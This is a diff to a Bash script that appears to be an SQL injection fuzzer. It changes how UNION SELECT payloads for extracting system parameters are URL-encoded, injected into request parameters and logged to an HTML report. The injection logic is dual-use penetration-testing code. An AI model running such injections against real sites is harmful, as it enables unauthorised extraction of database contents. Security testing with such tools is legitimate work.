@@ -310,11 +310,12 @@ selectsystemstrings()
 {
 echo "Attempting to extract system parameters (reading params from ./payloads/system-params.txt)"
 cat ./payloads/system-params.txt | while read inj3ct ; do
-	badparams=`echo "$outputstore" | replace "$encodedpayload" "1$quote+union+select+$nullstring$end"`
+	badparams=`echo "$outputstore" | replace "$encodedpayload" "0$quote%20union%20select%20$nullstring$end"`
 #	badparams=`echo "$outputstore"`
 	requester
 	cp ./dump ./selcheck1
-	badparams=`echo "$badparams" | replace "$selinject" "$inj3ct"`
+	newencodedpayload=`echo $inj3ct | replace " " "%20" | replace "." "%2e" | replace "<" "%3c" | replace ">" "%3e" | replace "?" "%3f" | replace "+" "%2b" | replace "*" "%2a" | replace ";" "%3b" | replace ":" "%3a" | replace "(" "%28" | replace ")" "%29" | replace "," "%2c"`
+	badparams=`echo "$badparams" | replace "$selinject" "$newencodedpayload"`
 	requester
 	status=`echo $response | cut -d ":" -f 1`
 	systemstring=`diff ./dump ./selcheck1`
@@ -329,7 +330,7 @@ cat ./payloads/system-params.txt | while read inj3ct ; do
 		else
 			if (($firstPOSTURIURL>0)) ; then
 				if [ $firstPOSTURIURL == 1 ] ; then
-					echo "[SEL-LENGTH-DIFF $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt ] $method URL: $uhostnam$page"?"$static"??"$badparams" >> ./output/$safefilename$safelogname.txt
+					echo "[SEL-LENGTH-DIFF $inj3ct REQ:$K $safefilename-selectrespdiff-R-$K-P-$payloadcounter.txt] $method URL: $uhostname$page"?"$static"??"$badparams" >> ./output/$safefilename$safelogname.txt
 					echo -e '\E[31;48m'"\033[1m[SEL-LENGTH-DIFF $inj3ct REQ:$K]\033[0m $method URL: $uhostname$page"?"$static"??"$badparams";
 					tput sgr0 # Reset attributes.
 				else
@@ -1645,7 +1646,7 @@ cat ./output/$safefilename$safelogname.sorted.txt | while read aLINE ; do
 			echo "Host: $host" >> ./output/$safefilename$safelogname.html
 			echo "<br>" >> ./output/$safefilename$safelogname.html
 			echo "<br>" >> ./output/$safefilename$safelogname.html
-			decparam=`echo $postdataparams | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" ","`;
+			decparam=`echo $postdataparams | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "(" | replace "%29" ")" | replace "%2c" ","`;
 			echo "$decparam" >> ./output/$safefilename$safelogname.html
 			echo "<br>" >> ./output/$safefilename$safelogname.html			
 			echo "<br>" >> ./output/$safefilename$safelogname.html
@@ -1654,7 +1655,7 @@ cat ./output/$safefilename$safelogname.sorted.txt | while read aLINE ; do
 				paramname=`echo $param | cut -d "=" -f 1`
 				paramval=`echo $param | cut -d "=" -f 2`
 				#this is the in the inverse of the encoding line in the fuzz loop
-				decparam=`echo $paramval | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" ","`;
+				decparam=`echo $paramval | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "(" | replace "%29" ")" | replace "%2c" ","`;
 				echo -n "<Input type="hidden" name=\""$paramname"\" value=\""$decparam"\"> " >> ./output/$safefilename$safelogname.html
 				#echo "<br>" >> ./output/$safefilename$safelogname.html
 			done
